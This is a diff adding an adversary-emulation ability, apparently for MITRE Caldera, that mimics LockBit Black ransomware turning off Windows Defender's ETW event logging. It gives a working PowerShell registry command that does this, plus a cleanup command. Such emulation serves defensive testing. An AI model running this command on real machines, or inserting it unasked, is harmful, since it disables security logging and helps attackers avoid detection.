@@ -1,0 +1,25 @@
+---
+- id: 54ef63765cf80243f370958bcf738338
+  name: LockBit Black - Disable the ETW Provider of Windows Defender -Powershell
+  description: 'An adversary can disable the ETW Provider of Windows Defender,
+
+    so nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.
+
+    https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows
+          Defender/Operational" -Name Enabled  -PropertyType DWord -Value 0 -Force
+        payloads: []
+        cleanup: Remove-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows
+          Defender/Operational" -Name Enabled -Force -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
